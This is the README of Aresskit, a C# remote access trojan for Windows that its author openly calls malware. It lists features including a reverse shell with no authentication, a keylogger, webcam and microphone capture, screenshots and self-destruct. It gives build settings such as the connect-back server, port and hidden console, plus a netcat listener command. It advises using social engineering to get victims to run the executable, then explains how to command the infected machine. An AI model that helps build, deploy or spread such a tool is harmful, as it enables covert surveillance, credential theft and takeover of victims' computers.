# Aresskit - (Stable) v1.2.1
### -- Fully featured Remote Administration Tool (RAT)
**Read the** [**Aresskit WiKi**](https://github.com/BlackVikingPro/aresskit/wiki)

***

### What is Ares?
**Ares - Arsenal of Reaping Exploitational Suffering (for lack of a better name)** <br />
Ares is my first large-scale framework consiting of special, hand-crafted malware <br />
for the Windows OS. This framework was designed to work with Windows 7 and up, <br />
however it has only been tested on Windows 10. 


Aresskit is designed to infest a target machine, and under special command and control <br />
it has the ability to programmatically assume control over the victim. In which it can <br />
execute administrative tasks that vary in complexity and strength. 

### Some quick features of Aresskit:
* Aresskit comes equipped with networking tools and administration tools such as:
* Built-In Port Scanner
* Reverse Command Prompt Shell (minimalistic, no auth required)
* UDP/TCP Port Listener (similar to Netcat)
* File downloader/uploader
* Live Cam/Mic Feed (extra-fee)
* Screenshot(s)
* Real-Time and Log-based Keylogger
* Self-destruct feature (protect your privacy)

***

### Build Requirements:
Some of these may not be required, but they do help in development
 * Visual Studio 2017
 * .NET Framework 4
 * Costura.Fody
	* `PM> Install-Package Costura.Fody`
 * Json.NET
	* `PM> Install-Package Newtonsoft.Json`

### How Aresskit works:
The software has a simple concept, yet a complicated design. The idea of Aresskit is <br />
to be deployed and executed on a target machine, then to send a specially constructed <br />
command line interface back to the attacker's listening server. Then, the attacker <br />
will be able to pipe commands back to the infected machine, in which the specified <br />
commands are programmed into the source code for ease of access/use. 

### How to build/deploy Aresskit
So, most of the pre-built functions require hardcoded variables to operate cleanly. <br />
The `Program.cs` file is the main one that contains all required configuration and such. <br />
The hardcoded elements that will need configuration are as follows on `line 10` in `Program.cs`

```csharp
const string server = "localhost"; // Server to connect back to
const int port = 9000; // Port to communicate through
const bool hideConsole = true; // Hide console window (recommended)
```
After these variables are configured to meet your requirements, you can simply build the <br />
program using Visual Studio. Afterwards, just get your `aresskit.exe` and deploy!

### How to use Aresskit
In order to use Aresskit, you will need a VPS or at least some other port listener. <br />
For my testing purposes, I used Netcat (native on Linux as command `nc`). You can use <br />
pretty much anything you would like to though. 
1. The fist thing you'll need to do is to open a port and listen for connections on it <br />
 using netcat. This command should help: `$ nc -lvk 9000`. Make sure no firewalls are <br />
 blocking connections on whatever port you choose.
2. The program, assuming it has already been deployed, now needs to be executed either <br />
 by you, the attacker, or the victim (try Social Engineering).
3. Then, once the program is executed on the victim's end, you should now see some <br />
 text being piped back to you on your listening port. The text should simply display <br />
 `aresskit> .`. Which now you can start piping your commands and controlling the victim! <br />

### How to control Aresskit after it has been deployed/executed:
So now that you've deployed and executed the malware onto your target, you need to learn <br />
the basics of how the program works. Much like Meterpreter, it is able to recieve and parse <br />
custom commands to be executed by the malare. 

The way the command and control system works is that whenever it received input, the <br />
syntax is required to match up to Class/Method names built into the software. For example, <br />
you would pipe in the command `aresskit> Administration::IsAdmin`, and the <br />
malware should return **True** or **False**, based on whether or not the executable has <br />
administrative permissions. Notice that **Administration** is the name of the class that is built <br />
into the software (take a look at `Administration.cs`). For every class/method there is built <br />
into the malware, it then becomes a new command in the interpreter. 

This design system was created to create an extremely easy, and effective method of allowing <br />
other engineers to include custom commands into the malware to give it more power and user <br />
customizability. 

***

### Disclaimer:
This software/framework was NOT designed for improper use. I do NOT conduct nor condone <br />
illegal/restricted use of this software. I am NOT responsible for actions carried out <br />
by any user of this software/framework. This is available as a free software for <br />
personal/commercial use. 

### Help/Support:
This was not an easy project for me. Being build purely in C#, I mainly developed this <br />
framework to do my best at learning C# quickly and efficiently. All beta builds of this <br />
specific software (Aresskit) may not be 100% usable and may even prove to show some major <br />
complications of use as they may persist of unstable, experimental features being added <br />
to the project. All bug fixes, branches, or recreations of the software are highly <br />
encouraged by me, as I would like to see this framework become more then just useless software. <br />
All revisions of this code will most definitely be acknowledged by me, and rewards may be <br />
given to those that participate in this project with me.
